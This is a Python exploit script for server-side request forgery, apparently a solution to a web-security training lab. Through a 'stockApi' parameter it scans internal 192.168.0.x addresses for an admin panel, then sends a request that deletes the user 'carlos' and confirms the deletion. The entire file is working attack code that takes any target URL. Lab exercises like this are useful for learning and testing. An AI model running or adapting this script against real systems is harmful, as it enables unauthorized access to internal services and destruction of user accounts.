
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy settings for debugging with Burp Suite
proxy_settings = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def find_admin_ip(target_url):
    endpoint = "/product/stock"
    admin_ip = ''
    
    # Attempt to find the correct admin IP by iterating through possible local IPs
    for ip_suffix in range(1, 256):
        test_url = f'http://192.168.0.{ip_suffix}:8080/admin'
        params = {'stockApi': test_url}
        
        try:
            response = requests.post(target_url + endpoint, data=params, verify=False, proxies=proxy_settings, timeout=5)
            if response.status_code == 200:
                admin_ip = f'192.168.0.{ip_suffix}'
                print(f"(+) Admin IP found: {admin_ip}")
                break
        except requests.RequestException as e:
            print(f"(-) Connection to 192.168.0.{ip_suffix} failed: {e}")
    
    if not admin_ip:
        print("(-) Could not find the admin IP address.")
    return admin_ip

def remove_user(target_url, admin_ip):
    delete_user_payload = f'http://{admin_ip}:8080/admin/delete?username=carlos'
    endpoint = '/product/stock'
    params = {'stockApi': delete_user_payload}
    
    # Attempt to delete user
    try:
        response = requests.post(target_url + endpoint, data=params, verify=False, proxies=proxy_settings)
        if response.status_code == 200:
            print("(+) Delete request sent for user 'carlos'")
        else:
            print("(-) Delete request failed.")
    except requests.RequestException as e:
        print(f"(-) Error while attempting to delete user: {e}")
        return

    # Verify user deletion
    check_admin_payload = f'http://{admin_ip}:8080/admin'
    verification_params = {'stockApi': check_admin_payload}
    
    try:
        verification_response = requests.post(target_url + endpoint, data=verification_params, verify=False, proxies=proxy_settings)
        if 'User deleted successfully' in verification_response.text:
            print("(+) Successfully deleted Carlos user.")
        else:
            print("(-) Verification of deletion failed or exploit was unsuccessful.")
    except requests.RequestException as e:
        print(f"(-) Error during verification: {e}")

def main():
    # Check if target URL argument is provided
    if len(sys.argv) != 2:
        print("(+) Usage: %s <target_url>" % sys.argv[0])
        print("(+) Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(1)
    
    target_url = sys.argv[1]
    print("(+) Searching for admin IP address...")
    
    # Find the admin IP address
    admin_ip = find_admin_ip(target_url)
    if not admin_ip:
        print("(-) Exiting script, no admin IP found.")
        sys.exit(1)
    
    # Proceed with user deletion if admin IP was found
    print("(+) Attempting to delete user 'carlos'...")
    remove_user(target_url, admin_ip)

if __name__ == "__main__":
    main()
